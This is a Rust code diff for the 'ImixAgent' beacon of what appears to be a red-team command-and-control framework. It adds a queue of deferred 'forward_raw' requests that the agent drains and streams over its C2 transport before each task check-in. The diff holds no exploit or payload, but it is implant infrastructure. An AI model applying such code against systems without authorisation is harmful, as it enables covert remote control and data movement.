@@ -34,6 +34,15 @@ pub struct ImixAgent {
     pub process_list_tx: std::sync::mpsc::SyncSender<c2::ReportProcessListRequest>,
     pub process_list_rx: Arc<Mutex<std::sync::mpsc::Receiver<c2::ReportProcessListRequest>>>,
     pub shell_manager_tx: tokio::sync::mpsc::Sender<ShellManagerMessage>,
+    pub pending_forwards: Arc<
+        tokio::sync::Mutex<
+            Vec<(
+                String,
+                tokio::sync::mpsc::Receiver<Vec<u8>>,
+                tokio::sync::mpsc::Sender<Vec<u8>>,
+            )>,
+        >,
+    >,
 }
 
 impl ImixAgent {
@@ -57,6 +66,7 @@ impl ImixAgent {
             process_list_tx,
             process_list_rx: Arc::new(Mutex::new(process_list_rx)),
             shell_manager_tx,
+            pending_forwards: Arc::new(tokio::sync::Mutex::new(Vec::new())),
         }
     }
 
@@ -326,6 +336,31 @@ impl ImixAgent {
     }
 
     pub async fn process_job_request(&self) -> Result<()> {
+        // Dispatch any pending forward_raw requests before checking in.
+        // Each forward is spawned so the beacon cycle is not blocked by long-running
+        // streaming calls (e.g. ReportFile).
+        let pending: Vec<_> = {
+            let mut forwards = self.pending_forwards.lock().await;
+            forwards.drain(..).collect()
+        };
+        for (path, rx, tx) in pending {
+            let agent = self.clone();
+            self.runtime_handle.spawn(async move {
+                if let Ok(mut t) = agent.get_usable_transport().await {
+                    if let Err(_e) = t.forward_raw(path.clone(), rx, tx).await {
+                        #[cfg(debug_assertions)]
+                        log::error!("Deferred forward_raw to {} failed: {}", path, _e);
+                    }
+                } else {
+                    #[cfg(debug_assertions)]
+                    log::error!(
+                        "Failed to get transport for deferred forward_raw to {}",
+                        path
+                    );
+                }
+            });
+        }
+
         let resp = self.claim_tasks().await?;
 
         let mut has_work = false;
@@ -415,6 +450,7 @@ impl ImixAgent {
 }
 
 // Implement the Eldritch Agent Trait
+#[async_trait::async_trait]
 impl Agent for ImixAgent {
     fn fetch_asset(&self, req: c2::FetchAssetRequest) -> Result<Vec<u8>, String> {
         self.with_transport(|mut t| async move {
@@ -500,6 +536,17 @@ impl Agent for ImixAgent {
 
     fn claim_tasks(&self, req: c2::ClaimTasksRequest) -> Result<c2::ClaimTasksResponse, String> {
         self.with_transport(|mut t| async move { t.claim_tasks(req).await })
+    }
+
+    async fn forward_raw(
+        &self,
+        path: String,
+        rx: tokio::sync::mpsc::Receiver<Vec<u8>>,
+        tx: tokio::sync::mpsc::Sender<Vec<u8>>,
+    ) -> Result<(), String> {
+        let mut forwards = self.pending_forwards.lock().await;
+        forwards.push((path, rx, tx));
+        Ok(())
     }
 
     fn get_config(&self) -> Result<BTreeMap<String, String>, String> {
